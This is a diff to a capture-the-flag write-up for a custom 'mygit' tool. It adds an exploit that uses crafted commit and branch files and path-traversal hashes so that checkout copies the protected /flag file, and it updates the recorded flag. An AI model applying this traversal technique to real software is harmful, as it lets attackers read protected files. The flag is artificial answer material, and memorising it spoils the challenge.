@@ -84,8 +84,64 @@ cat /home/FLAG
 ```
 
 ### Notes
-- The flag is truncated to 40 characters due to the commit hash length limit (0x28 bytes)
-- Full flag is 44 characters, missing last 4 chars
+- The basic exploit only extracts 40 characters due to the commit hash length limit (0x28 bytes)
+- For the full flag (44 characters), use the advanced exploit below
+
+### Advanced Exploit - Full Flag Extraction
+
+The basic exploit truncates to 40 bytes because `commit_current()` uses `strncpy(..., 0x28)`. However, we can bypass this by crafting a fake commit file that makes `checkout` read `/flag` via `object_read()` which doesn't truncate.
+
+**Key insight**: When `checkout` restores files from a commit, it:
+1. Reads file hash from commit
+2. Calls `object_read(hash)` which reads from `.mygit/objects/<hash>`
+3. Calls `file_write(filename, content, size)` with FULL content
+
+If we can make the hash contain path traversal (e.g., `../../../../../flag`), `object_read` will read `/flag` directly and write its FULL content.
+
+**Exploit Steps:**
+
+1. Create a fake commit file (`fc`) in your home directory:
+```bash
+cat > ~/fc << 'EOF'
+parent 0000000000000000000000000000000000000000
+timestamp 1234567890
+message pwned
+files 1
+../../../../../././././././././././flag FULLFLAG
+EOF
+```
+
+2. Create a file (`myhead`) containing a path traversal "commit hash" that points to `fc`:
+```bash
+# From .mygit/commits/, need ../../../ (3 levels) to reach home
+# Total must be 33+ chars for overflow: ../../../ + ./ padding + fc
+STR="../../../"
+for i in {1..14}; do STR="${STR}./"; done
+STR="${STR}fc"
+printf "%s" "$STR" > ~/myhead  # 39 chars
+```
+
+3. Initialize repo and checkout to the fake "branch":
+```bash
+mkdir exploit && cd exploit
+mygit init
+mygit branch dummy
+# Checkout to ~/myhead using path traversal (34+ chars for overflow)
+mygit checkout "././././././././../../../../myhead"
+```
+
+4. The checkout process:
+   - Reads `~/myhead` as the branch file (path traversal bypasses check)
+   - Gets "commit hash" = `../../.././...fc`
+   - Reads commit from `.mygit/commits/../../.././...fc` → `~/fc`
+   - Parses `fc`, finds file entry with hash `../../../../.././...flag`
+   - Calls `object_read("../../../../.././...flag")` → reads `.mygit/objects/../../../../.././...flag` → `/flag`
+   - Writes FULL flag content to `FULLFLAG`
+
+5. Read the flag:
+```bash
+cat ~/exploit/FULLFLAG
+```
 
 ### Flag
-> `pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_too}`
+> `pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}`
